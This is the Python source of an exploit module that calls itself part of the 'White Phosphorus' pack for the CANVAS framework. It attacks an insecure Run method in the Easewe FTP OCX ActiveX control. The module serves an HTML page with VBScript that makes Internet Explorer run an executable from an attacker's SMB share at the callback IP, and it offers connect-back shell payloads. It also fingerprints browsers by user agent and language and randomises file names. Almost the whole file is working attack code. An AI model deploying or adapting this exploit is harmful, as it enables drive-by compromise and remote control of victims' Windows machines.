
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator
from pelib import PElib

######################################################################################
NAME = "Easewe FTP OCX ActiveX Control Insecure Method Remote Code Execution"
DESCRIPTION = "Exploits an insecure method in the Easewe FTP OCX ActiveX Control"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Easewe'
DOCUMENTATION["Date public"] = "2011-06-22"
DOCUMENTATION["CVE"] = "N/A"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION["References"] = "http://www.securityfocus.com/archive/1/518573"
DOCUMENTATION["Notes"] = """
THIS EXPLOIT MUST BE SERVED VIA HTTPSERVER.

This vulnerability exploits an insecure Run method in the Easewe FTP OCX ActiveX Control.
wp_smbserver_backdoor is used to serve the payload over a UNC share.

Windows based CANVAS users must first disable the native Windows SMB server before running the
module. On Windows 7 this is done by disabling the 'Server' and 'TCP/IP NetBIOS Helper' services
and rebooting the system.

Instructions:
1. Disable native SMB server and reboot
2. Run module via HTTPSERVER
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
THIS EXPLOIT MUST BE SERVED VIA HTTPSERVER.

This vulnerability exploits an insecure Run method in the Easewe FTP OCX ActiveX Control.
wp_smbserver_backdoor is used to serve the payload over a UNC share.

Windows based CANVAS users must first disable the native Windows SMB server before running the
module. On Windows 7 this is done by disabling the 'Server' and 'TCP/IP NetBIOS Helper' services
and rebooting the system.

Instructions:
1. Disable native SMB server and reboot
2. Run module via HTTPSERVER

------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Easewe FTP OCX ActiveX Control Insecure Method Remote Code Execution
------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal (DEP)

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_easewe_ftpocx_insecuremethod/wp_easewe_ftpocx_insecuremethod.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################


# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal (DEP)", (0x00000000), [WINALL]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.encode_printable = True
        self.alignstack = True
        self.badstring = "\x00\x09\x0a\x0b\x0c\x0d\x22\x5c"
        
        #Ranomisze name for clientd
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.sharefilename = "\\" + "".join( [ random.choice(string.lowercase) for x in range(4) ] ) + "\\"+ "".join( [ random.choice(string.lowercase) for x in range(4) ] ) + ".exe"
                
        # HTTP Custom Stuff
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        return

    def is_vulnerable(self, info_dict):
        # Called from ClientD, returns a value used to rank the exploit within attacking modules
        """
        Check for IE 6
        """
        self.isClientD = True
        if "MSIE" in info_dict['user_agent']:
            self.log("WP> Target has MSIE")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] #it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # If Called from clientD, update shellcode accordingly
        if self.isClientD:    
            if self.useSSLMOSDEF:
                self.DEFAULT_PAYLOAD = 1
            else:
                self.DEFAULT_PAYLOAD = 2
            
        # Selected shell options
        self.wp_getShellcodeType()
        
        # If called from clientD there will be no target here
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makefile(self):
        payload = "\\\\" + self.callback.ip + self.sharefilename
        filedata="""<html>
<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target'></object>
<script language='vbscript'>
arg1 = "PAYLOAD"
target.Run arg1
</script>
</html>
"""
        filedata = filedata.replace('PAYLOAD', payload)
        return filedata

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        self.log("WP> Starting wp_smbserver_backdoor to serve Payload")
        try:
            app=self.engine.getModuleExploit("wp_smbserver_backdoor")
            app.link(self) # this will set all its arguments to your arguments
            app.argsDict['sharefilename'] = self.sharefilename
            ret=app.run()
        except:
            self.log("WP> Unable to start wp_smbserver_backdoor - port 443 already bound?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return None,None
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
    
        self.log('WP> User agent of connecting host: %s' % user_agent)        
        
        if clientheader.URL.count(self.filename):
            self.log('WP> Serving exploit file')

            data=self.makefile()
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        return h,b

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
